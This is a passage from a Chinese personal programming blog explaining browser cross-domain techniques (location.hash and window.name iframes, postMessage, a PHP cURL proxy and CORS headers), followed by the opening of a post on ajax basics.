<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="built_in">document</span>.write(location.hash);<span class="comment">//输出#part2</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是#类似于书签的功能，改变hash的数值并不会使得页面跳转或者刷新，既可以作为<br>页内传输数据，也可以用于这次讨论的跨域传输数据。<br>假设现在有两个页面，发起请求的www.a.com/a.html，和被请求的www.b.com/b.html<br>首先在a建立一个隐藏的iframe，src指向b.html，同时使用hash来传递参数，b接受到参数后<br>知道这是一个请求而不是直接访问，所以设置一个观察到hash值时进行处理的函数。然后b<br>通过修改a的hash来返回参数，a这边也要设置一个计时器观察hash的变化来判断是否已经返回。<br>需要注意的一点是：有大部分浏览器不允许不同域的网页修改hash值，所以需要引用上边提到过<br>的第一种方法，借用a.com主域的一个页面,例如script.a.com/c.html来进行传值，即我们需要在<br>b得到请求后返回时通过创建iframe，src指向script.a.com/c.html同时带上返回的hash来传递参数。</p>
<p>a.html<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startRequest</span>(<span class="params"></span>)</span>&#123; <span class="comment">//创建一个iframe访问请求b</span></span><br><span class="line">    <span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">    ifr.style.display = <span class="string">'none'</span>;</span><br><span class="line">    ifr.src = <span class="string">'http://www.cnblogs.com/lab/cscript/cs2.html#paramdo'</span>; <span class="comment">//通过hash来让b知道这是一个</span></span><br><span class="line">                                                                     <span class="comment">//请求不是直接访问</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(ifr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkHash</span>(<span class="params"></span>) </span>&#123; <span class="comment">//定时观察数据的返回状态</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> data = location.hash ? location.hash.substring(<span class="number">1</span>) : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">console</span>.log) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Now the data is '</span>+data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">setInterval(checkHash, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure></p>
<p>b.html<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模拟一个简单的参数处理操作</span></span><br><span class="line"><span class="keyword">switch</span>(location.hash)&#123; <span class="comment">//看看hash的请求是什么</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'#paramdo'</span>:</span><br><span class="line">        callBack(); <span class="comment">//响应函数</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'#paramset'</span>:</span><br><span class="line">        <span class="comment">//do something……</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callBack</span>(<span class="params"></span>)</span>&#123; <span class="comment">//返回参数</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        parent.location.hash = <span class="string">'somedata'</span>; <span class="comment">//假如可以直接修改就直接通过parent.location.hash来修改</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="comment">// ie、chrome的安全机制无法修改parent.location.hash，</span></span><br><span class="line">        <span class="comment">// 所以要利用一个中间的cnblogs域下的代理iframe</span></span><br><span class="line">        <span class="keyword">var</span> ifrproxy = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">        ifrproxy.style.display = <span class="string">'none'</span>;</span><br><span class="line">        ifrproxy.src = <span class="string">'http://script.a.html#somedata'</span>;    <span class="comment">// 注意该文件在"a.com"域下,第一种方法的应用</span></span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(ifrproxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>c.html<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//因为parent.parent和自身属于同一个域，所以可以改变其location.hash的值</span></span><br><span class="line">parent.parent.location.hash = self.location.hash.substring(<span class="number">1</span>);<span class="comment">//这里是修改parent.parent因为嵌套了两层</span></span><br></pre></td></tr></table></figure></p>
<p>补充：当然这样做也存在很多缺点，诸如数据直接暴露在了url中，数据容量和类型都有限等……</p>
<h3 id="4-window-name实现的跨域数据传输"><a href="#4-window-name实现的跨域数据传输" class="headerlink" title="4.window.name实现的跨域数据传输"></a>4.window.name实现的跨域数据传输</h3><p>其实这种方法与上边的方法类似，原理都是绕过浏览器的同源策略的限制，都是通过一个网页属性，<br>上边使用的是location.hash，这里使用的是window.name。<br>在iframe里有一个属性很特别，那就是window.name，它是一个全局的变量，不会随着iframe的请求<br>链接变化而变化，所以类似于上一种方法，我们可以在访问b时，在b里通过window.name设置好要返回<br>的参数，然后在与a同主域的代理页c里输出，最后a通过c获得返回值。流程如下：<br>a创建一个iframe，src指向b，同时设置iframe的onload函数，函数处理返回，这样才能及时获得返回。<br>b通过window.name属性设置要传递的参数，类型不限，然后重定向即跳转到c。onload函数第一次触发。<br>c通过获取window.name再输出来让a获取，onload函数第二次触发。</p>
<p>a.html<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">domainData</span>(<span class="params">url, fn</span>)//<span class="title">url</span> 是被请求的页面，<span class="title">fn</span>是处理返回函数</span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> isFirst = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">        iframe.style.display = <span class="string">'none'</span>;</span><br><span class="line">        <span class="keyword">var</span> loadfn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(isFirst)&#123; <span class="comment">//第一次触发，这是iframe还是b，不能获得参数</span></span><br><span class="line">                iframe.contentWindow.location = <span class="string">'a.com/c.html'</span>;<span class="comment">//重定向到c但是window.name并不会改变</span></span><br><span class="line">                isFirst = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                fn(iframe.contentWindow.name);<span class="comment">//第二次触发，此时iframe是c，已经可以获得参数了</span></span><br><span class="line">                iframe.contentWindow.document.write(<span class="string">''</span>);</span><br><span class="line">                iframe.contentWindow.close();<span class="comment">//关闭以保证安全</span></span><br><span class="line">                <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">                iframe.src = <span class="string">''</span>;</span><br><span class="line">                iframe = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        iframe.src = url; <span class="comment">//访问b</span></span><br><span class="line">        <span class="keyword">if</span>(iframe.attachEvent)&#123; <span class="comment">//onload绑定一定要这样写</span></span><br><span class="line">            iframe.attachEvent(<span class="string">'onload'</span>, loadfn);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            iframe.onload = loadfn;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>b.html<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.name = <span class="string">"return b data"</span> <span class="comment">//设置要返回的参数</span></span><br></pre></td></tr></table></figure></p>
<p>c.html<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="built_in">window</span>.name); <span class="comment">//输出参数</span></span><br></pre></td></tr></table></figure></p>
<p>补充：总结起来即：iframe的src属性由外域转向本地域，跨域数据即由iframe<br>的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，<br>通过销毁iframe同时它又是安全操作。</p>
<h3 id="5-使用html5-postMessage"><a href="#5-使用html5-postMessage" class="headerlink" title="5. 使用html5 postMessage"></a>5. 使用html5 postMessage</h3><p>html5的新功能跨文档消息传输Cross Document Messaging，使用postMessage和onMessage。<br>首先我们简单的看看在同域的时候是如何使用的。<br>请求页面a.html<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/JavaScript"</span>&gt; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'compute.js'</span>); <span class="comment">//new 一个worker去调用同域下的compute.js</span></span><br><span class="line"><span class="comment">//event 参数中有 data 属性，就是子线程中返回的结果数据</span></span><br><span class="line">worker.onmessage= <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;  <span class="comment">//onMessage是触发型，监视返回</span></span><br><span class="line"><span class="comment">// 把子线程返回的结果添加到 div 上</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"result"</span>).innerHTML += </span><br><span class="line">event.data+<span class="string">"&lt;br/&gt;"</span>; </span><br><span class="line">&#125;; </span><br><span class="line">&#125; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>被请求的compute.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timedCount</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>,sum=<span class="number">0</span>;j&lt;<span class="number">100</span>;j++)&#123; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)&#123; </span><br><span class="line">sum+=i; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 调用 postMessage 向主线程发送消息</span></span><br><span class="line">postMessage(sum); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//可以多个返回，没用一次就触发a的onMessage</span></span><br><span class="line">postMessage(<span class="string">"Before computing,"</span>+<span class="keyword">new</span> <span class="built_in">Date</span>()); </span><br><span class="line">timedCount(); </span><br><span class="line">postMessage(<span class="string">"After computing,"</span>+<span class="keyword">new</span> <span class="built_in">Date</span>());</span><br></pre></td></tr></table></figure></p>
<p>只是同源时候的调用，十分简单，但是我们关注的是跨域访问，这时html5登场了。<br>HTML5 提供了在网页文档之间互相接收与发送信息的功能。使用这个功能，只要获取<br>到网页所在窗口对象的实例，不仅同源（域 + 端口号）的 Web 网页之间可以互相通信，<br>甚至可以实现跨域通信。<br>先来看看postMessage的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message, targetOrigin);</span><br><span class="line">otherWindow: 对接收信息页面的window的引用。可以是页面中iframe的contentWindow属性；</span><br><span class="line">window.open的返回值；通过name或下标从window.frames取到的值。</span><br><span class="line">message: 所要发送的数据，string类型。</span><br><span class="line">targetOrigin: 请求目标url，用于限制otherWindow，“*”表示不作限制</span><br></pre></td></tr></table></figure></p>
<p>假设有发起请求方a.com/a.html和被请求方b.com/b.html<br>a.html<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">"ifr"</span> src=<span class="string">"b.com/b.html"</span>&gt;&lt;/iframe&gt;<span class="comment">//通过iframe来访问b</span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ifr = <span class="built_in">document</span>.getElementById(<span class="string">'ifr'</span>);<span class="comment">//获取iframe对象来调用postMessage</span></span><br><span class="line">    <span class="keyword">var</span> targetOrigin = <span class="string">'http://b.com'</span>;  <span class="comment">// 若写成'http://b.com/c/b.html'效果一样</span></span><br><span class="line">                                        <span class="comment">// 若写成'http://c.com'就不会执行postMessage了，因为与iframe的src不同源</span></span><br><span class="line">    ifr.contentWindow.postMessage(<span class="string">'I was there!'</span>, targetOrigin);<span class="comment">//发送请求</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//同时a也要设置监视器等待返回</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'return'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123; <span class="comment">//监视器m</span></span><br><span class="line">        <span class="comment">// 通过origin属性判断消息来源地址</span></span><br><span class="line">        <span class="keyword">if</span> (event.origin == <span class="string">'http://b.com'</span>) &#123; <span class="comment">//以event为对象提取内容，可以用作安全监测</span></span><br><span class="line">            <span class="built_in">console</span>.log(data)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="literal">false</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>b.html 做好监视和返回工作<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123; <span class="comment">//监视器message</span></span><br><span class="line">        <span class="comment">// 通过origin属性判断消息来源地址</span></span><br><span class="line">        <span class="keyword">if</span> (event.origin == <span class="string">'http://a.com'</span>) &#123; <span class="comment">//以event为对象提取内容，可以用作安全监测</span></span><br><span class="line">            <span class="keyword">var</span> data = <span class="string">"return from b"</span>;</span><br><span class="line">            <span class="built_in">window</span>.parent.postMessage(data,<span class="string">"http://a.com"</span>);<span class="comment">//返回数据</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="literal">false</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="6-利用flash"><a href="#6-利用flash" class="headerlink" title="6. 利用flash"></a>6. 利用flash</h3><p>这个有点过于复杂我也没看懂就不管了，有兴趣自行学习吧。。。。</p>
<h3 id="7-后台代理"><a href="#7-后台代理" class="headerlink" title="7. 后台代理"></a>7. 后台代理</h3><p>典型的把工作交给后台脚本去处理跨域访问的问题，由于我是学php的，所以只介绍<br>一下php的，php中主要使用了curl这个类来实现跨域访问，实际上就是在后台访问一个<br>页面，然后通过爬取之类的方法来获得返回，原理也是跟ajax一样构造xmlhttprequest请求<br>但是支持跨域，在使用前必须先开始服务器的curl服务。<br>ajax发给后台脚本前边已经提过就不再累赘了。<br>规范的介绍一下curl：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cURL可以使用URL的语法模拟浏览器来传输数据，</span><br><span class="line">因为它是模拟浏览器，因此它同样支持多种协议，</span><br><span class="line">FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP等协议都可以很好的支持，包括一些：</span><br><span class="line">HTTPS认证，HTTP POST方法，HTTP PUT方法，FTP上传，keyberos认证，HTTP上传，代理服务器，cookies，</span><br><span class="line">用户名/密码认证，</span><br><span class="line">下载文件断点续传，上传文件断点续传，http代理服务器管道，甚至它还支持IPv6，scoket5代理服务器，</span><br><span class="line">通过http代理服务器上传文件到FTP服务器等等。</span><br></pre></td></tr></table></figure>
<p>步骤：<br>1.初始化，创建一个新cURL资源</p>
<p>2.设置URL和相应的选项</p>
<p>3.抓取URL并把它传递给浏览器</p>
<p>4.关闭cURL资源，并且释放系统资源</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//1.初始化，创建一个新cURL资源</span></span><br><span class="line"> </span><br><span class="line">$ch = curl_init();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://www.lampbrother.net/"</span>);</span><br><span class="line"> </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//3.抓取URL并把它传递给浏览器</span></span><br><span class="line"> </span><br><span class="line">curl_exec($ch);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//4.关闭cURL资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">curl_close($ch);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以其实这是很简单的访问抓取过程…..应该不用详细讲解了，自行试验一下。</p>
<p>补充，CURL_OPTION是设置请求时相关设置，有很多项，这里就不详细讲了，<a href="http://blog.csdn.net/yanhui_wei/article/details/21530811" target="_blank" rel="external">请参考</a></p>
<h3 id="8-跨域资源共享（CORS）"><a href="#8-跨域资源共享（CORS）" class="headerlink" title="8. 跨域资源共享（CORS）"></a>8. 跨域资源共享（CORS）</h3><p>这个我之前也没有怎么接触过，先来来看看定义吧：</p>
<p>CORS其实出现时间不短了，它在维基百科上的定义是：跨域资源共享（CORS ）是一种网络浏览器的技术规范，<br>它为Web服务器定义了一种方式，允许网页从不同的域访问其资源。而这种访问是被同源策略所禁止的。<br>CORS系统定义了一种浏览器和服务器交互的方式来确定是否允许跨域请求。 它是一个妥协，有更大的灵活性，<br>但比起简单地允许所有这些的要求来说更加安全。而W3C的官方文档目前还是工作草案，但是正在朝着W3C推荐<br>的方向前进。简言之，CORS就是为了让AJAX可以实现可控的跨域访问而生的。</p>
<p>因为我也没研究过，所以最后这个方法也就只做一下搬运<a href="http://www.cnblogs.com/yuzhongwusan/p/3677955.html" target="_blank" rel="external">自蒋宇捷的博客（http://blog.csdn.net/hfahe）</a><br>  要使用CORS，我们需要了解前端和服务器端的使用方法。<br>  1、  前端<br>  以前我们使用Ajax，代码类似于如下的方式：<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();  </span><br><span class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"/hfahe"</span>, <span class="literal">true</span>);  </span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure></p>
<p>   这里的“/hfahe”是本域的相对路径。<br>   如果我们要使用CORS，相关Ajax代码可能如下所示：</p>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();  </span><br><span class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://blog.csdn.net/hfahe"</span>, <span class="literal">true</span>);  </span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<p>  请注意，代码与之前的区别就在于相对路径换成了其他域的绝对路径，也就是你要跨域访问的接口地址。<br>  我们还必须提供浏览器回退功能检测和支持，避免浏览器不支持的情况。<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCORSRequest</span>(<span class="params">method, url</span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();  </span><br><span class="line">  <span class="keyword">if</span> (<span class="string">"withCredentials"</span> <span class="keyword">in</span> xhr) &#123;  </span><br><span class="line">    <span class="comment">// 此时即支持CORS的情况  </span></span><br><span class="line">    <span class="comment">// 检查XMLHttpRequest对象是否有“withCredentials”属性  </span></span><br><span class="line">    <span class="comment">// “withCredentials”仅存在于XMLHTTPRequest2对象里  </span></span><br><span class="line">    xhr.open(method, url, <span class="literal">true</span>);  </span><br><span class="line">   </span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>!= <span class="string">"undefined"</span>) &#123;  </span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 否则检查是否支持XDomainRequest，IE8和IE9支持  </span></span><br><span class="line">    <span class="comment">// XDomainRequest仅存在于IE中，是IE用于支持CORS请求的方式  </span></span><br><span class="line">    xhr = <span class="keyword">new</span> XDomainRequest();  </span><br><span class="line">    xhr.open(method, url);  </span><br><span class="line">   </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 否则，浏览器不支持CORS  </span></span><br><span class="line">    xhr = <span class="literal">null</span>;  </span><br><span class="line">   </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">return</span> xhr;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">var</span> xhr = createCORSRequest(<span class="string">'GET'</span>, url);  </span><br><span class="line"><span class="keyword">if</span> (!xhr) &#123;  </span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'CORS not supported'</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>  2、  服务器</p>
<pre><code>  服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来进行的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。

  HTTP 头的设置方法有很多，http://enable-cors.org/这篇文章里对各种服务器和语言的设置都有详细的介绍，下面我们主要介绍Apache和PHP里的设置方法。

  Apache：Apache需要使用mod_headers模块来激活HTTP头的设置，它默认是激活的。你只需要在Apache配置文件的&lt;Directory&gt;, &lt;Location&gt;, &lt;Files&gt;或&lt;VirtualHost&gt;的配置里加入以下内容即可：

  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header set Access-Control-Allow-Origin *</span><br></pre></td></tr></table></figure>



PHP：只需要使用如下的代码设置即可。
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> header(&quot;Access-Control-Allow-Origin:*&quot;);</span><br></pre></td></tr></table></figure>

 以上的配置的含义是允许任何域发起的请求都可以获取当前服务器的数据。当然，这样有很大的危险性，恶意站点可能通过XSS攻击我们的服务器。所以我们应该尽量有针对性的对限制安全的来源，例如下面的设置使得只有http://blog.csdn.net这个域才能跨域访问服务器的API。

 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://blog.csdn.net</span><br></pre></td></tr></table></figure>
</code></pre>
        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/跨域/">跨域</a><a href="/tags/ajax/">ajax</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/03/29/ajax/" title="ajax的简单复习" itemprop="url">ajax的简单复习</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-03-29T03:18:36.000Z" itemprop="datePublished"> 发表于 2016-03-29</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>这几天被问到ajax的问题，发现了一些以前没注意到的地方，所以决定系统地<br>重温一次ajax的内容。</p>
<h3 id="ajax的基本知识"><a href="#ajax的基本知识" class="headerlink" title="ajax的基本知识"></a>ajax的基本知识</h3><p>什么是ajax，引用w3c的介绍</p>
